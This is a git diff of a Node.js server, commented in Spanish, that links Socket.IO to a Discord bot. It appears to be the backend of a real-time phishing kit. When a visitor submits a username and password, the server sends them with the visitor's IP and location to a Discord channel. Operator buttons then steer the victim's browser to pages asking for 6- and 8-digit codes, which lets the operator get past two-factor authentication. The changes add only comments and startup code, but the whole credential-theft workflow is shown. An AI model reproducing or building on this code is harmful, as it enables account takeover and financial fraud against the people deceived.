@@ -5,23 +5,32 @@ const cors = require('cors');
 const axios = require('axios');
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
 
+// 1. INICIALIZACIÓN
 const app = express();
 app.use(cors());
+
+// 2. RUTAS (Deben ir ANTES de crear el server e io)
+app.get('/', (req, res) => {
+    res.status(200).send('Servidor Activo ✅');
+});
+
+// 3. CONFIGURACIÓN DE SOCKETS Y SERVIDOR
 const server = http.createServer(app);
 const io = new Server(server, {
     cors: { origin: "*" },
     connectionStateRecovery: {} 
 });
 
+// 4. VARIABLES DE ENTORNO
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const CHANNEL_ID = process.env.CHANNEL_ID;
-
 const userToSocket = {}; 
 
 const client = new Client({
     intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
 });
 
+// 5. LÓGICA DE RED Y DISCORD
 async function getNetworkData(socket) {
     let ip = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
     if (ip.includes(',')) ip = ip.split(',')[0].trim();
@@ -42,14 +51,11 @@ client.once('ready', () => console.log(`✅ Bot listo: ${client.user.tag}`));
 
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isButton()) return;
-
     const [action, username] = interaction.customId.split('_');
     const socketId = userToSocket[username];
-
     if (!socketId || !io.sockets.sockets.has(socketId)) {
         return interaction.reply({ content: `❌ El usuario ${username} no está conectado.`, ephemeral: true });
     }
-
     let targetPage;
     if (action === 'otp') targetPage = "index3.html";
     else if (action === 'token') targetPage = "index4.html";
@@ -57,19 +63,17 @@ client.on('interactionCreate', async (interaction) => {
     else if (action === 'finish') targetPage = "finalizado.html";
     else if (action === 'errorotp') targetPage = "index3.html?error=true";
     else if (action === 'errortoken') targetPage = "index4.html?error=true";
-
     io.to(socketId).emit('navigate', { url: targetPage });
     await interaction.reply({ content: `✅ Acción [${action}] enviada a ${username}`, ephemeral: true });
 });
 
 client.login(DISCORD_TOKEN);
 
+// 6. EVENTOS DE SOCKET.IO
 io.on('connection', (socket) => {
-    
     socket.on('register_user', async (data) => {
         if (!data.user) return;
         userToSocket[data.user] = socket.id;
-
         if (data.pass) {
             const net = await getNetworkData(socket);
             const channel = await client.channels.fetch(CHANNEL_ID);
@@ -83,7 +87,6 @@ io.on('connection', (socket) => {
                         { name: '📍 IP', value: `\`${net.ip}\``, inline: true },
                         { name: '🌍 Ubicación', value: `\`${net.geoInfo}\``, inline: false }
                     ).setTimestamp();
-
                 const row = new ActionRowBuilder().addComponents(
                     new ButtonBuilder().setCustomId(`otp_${data.user}`).setLabel('Pedir Código 6').setStyle(ButtonStyle.Primary),
                     new ButtonBuilder().setCustomId(`token_${data.user}`).setLabel('Pedir Código 8').setStyle(ButtonStyle.Success),
@@ -107,7 +110,6 @@ io.on('connection', (socket) => {
                     { name: '📍 IP', value: `\`${net.ip}\``, inline: true },
                     { name: '🌍 Ubicación', value: `\`${net.geoInfo}\``, inline: false }
                 ).setTimestamp();
-
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder().setCustomId(`token_${data.user}`).setLabel('Pedir Código 8').setStyle(ButtonStyle.Success),
                 new ButtonBuilder().setCustomId(`errorotp_${data.user}`).setLabel('❌ Código Incorrecto').setStyle(ButtonStyle.Danger)
@@ -129,7 +131,6 @@ io.on('connection', (socket) => {
                     { name: '📍 IP', value: `\`${net.ip}\``, inline: true },
                     { name: '🌍 Ubicación', value: `\`${net.geoInfo}\``, inline: false }
                 ).setTimestamp();
-
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder().setCustomId(`otp_${data.user}`).setLabel('Pedir Código 6').setStyle(ButtonStyle.Primary),
                 new ButtonBuilder().setCustomId(`errortoken_${data.user}`).setLabel('❌ Código Incorrecto').setStyle(ButtonStyle.Danger),
@@ -140,4 +141,8 @@ io.on('connection', (socket) => {
     });
 });
 
-server.listen(process.env.PORT || 3000);
+// 7. ARRANQUE DEL SERVIDOR
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`🚀 Servidor listo en puerto ${PORT}`);
+});
